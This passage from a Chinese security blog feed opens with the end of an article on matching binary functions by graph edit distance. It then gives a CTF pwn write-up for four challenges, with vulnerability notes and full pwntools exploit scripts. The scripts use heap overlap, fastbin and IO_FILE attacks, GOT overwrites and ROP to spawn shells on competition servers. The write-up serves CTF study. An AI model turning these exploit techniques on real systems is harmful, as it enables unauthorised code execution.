title="条件公式匹配"></a>条件公式匹配</h2><p>我们通过两个还数的条件公式进行匹配。它包括两个步骤。首先，我们计算两个的匹配成本CFs。其次，我们寻求CF之间的最佳匹配s由se-选择两组CF之间的最小匹配成本s和然后输出两个函数的相似度得分。直观上，可以利用字符串编辑距离来计算两个CF之间的匹配成本。但是，由于顺序不同，两个语义上等效的CF可能看起来是不同的。例如，( (a&gt; 0) &amp; (b&gt; 0) ) /ret0x20800将被视为与((b&gt;0)&amp;(a&gt;0))/ret=0x20800不相等，即使它们具有相同的行为级别的义。因为具有通信属性。为了避免重新排序问题，我们改为过其AST结构匹配两个CF。由于AST是树状结构,因此我们用图形编辑距离来计算在两个CF之间转换的成本。</p><p>我们利用算法[38]计算图形编辑距离ged (cfi, ecfj) 。在我们的情况下，并非所有节点都可以互换。例如，条件相关节点不能被动作相关节点代替。因此，在预先计算的映射成本矩阵算法中，我们为动作节点和条件芒点之间的映射成本分配了无限数。然后，使用两个CF的距离来计算两个函数的匹配成本。假设我们给了两个函数f1和f2,其中f1包含CF集[cf1。ef2, 。.. efn}和f2拥有集合1c 1,。… cfm).令mij为CF对的匹配因子:如果efi匹配ef，则u1j = 1;否则，mij=0。 因此，所有匹配因子形成一个匹配矩阵Mn × m，这说明了这两个函数如何相互对应。根据图形编辑距离。我们定义函数distance作为f1之间所有匹配的CF对的最小距离和f2。如我们所见，找到函数距离等于，找到最小的M(i，j)1小distlet. 。在换句话说。我们需要找到最佳匹配(最小匹配距离)之间的距离。请注意，由于贪婪方法只能产生次优的解决方案。因此无法单独使用每个函数中的CF的贪婪方法。寻找最优解，我们制定以下目标函数:<br><img alt="" data-src="https://i.loli.net/2020/03/18/iDrbAKG8Z2nQPTN.png" class="lozad"><br>(1) 是计算匹配的CF对之间的距离，并最小化该值。表示功能中每个CF的约束只能匹配一次。基于等式(1)，我们可以正式介绍函数距离。定义fl和f2的函数距离是fl和f2之间所有匹配的CF对的最小距离。令M代表方程的最佳解。</p><p>[38] Y. David, N. Partush, and E. Yahav, ‘‘Statistical similarity of binaries,’’ACM SIGPLAN Notices, vol. 51, no. 6, pp. 266–280, 2016.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇文章的主要思想和方法来源于一篇论文&lt;a href=&quot;https://www.semanticscholar.org/paper/Extr
      
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
